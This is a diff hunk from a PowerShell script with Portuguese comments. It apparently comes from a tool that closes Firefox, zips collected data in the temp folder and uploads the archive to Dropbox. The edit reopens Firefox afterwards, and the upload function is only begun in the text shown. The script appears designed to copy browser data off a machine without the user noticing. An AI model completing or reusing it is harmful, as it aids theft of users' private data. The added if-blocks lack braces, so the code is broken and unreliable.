@@ -553,9 +553,13 @@ Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 
 # Verificar se o Firefox foi fechado anteriormente e, se sim, reabri-lo
-if (-not $firefoxProcess) {
-    $firefoxExecutable = "C:\Program Files\Mozilla Firefox\firefox.exe"
-}
+# Abrir o Firefox novamente apenas se ele foi fechado anteriormente
+$firefoxWasClosed = (-not $firefoxProcess)
+if ($firefoxWasClosed) 
+    $firefoxExecutable = "C:\Program Files\Mozilla Firefox\firefox.exe"  # Substitua pelo caminho correto se necessário
+    if (Test-Path $firefoxExecutable) 
+        Start-Process $firefoxExecutable
+
 # Upload para a Dropbox
 
 function dropbox {
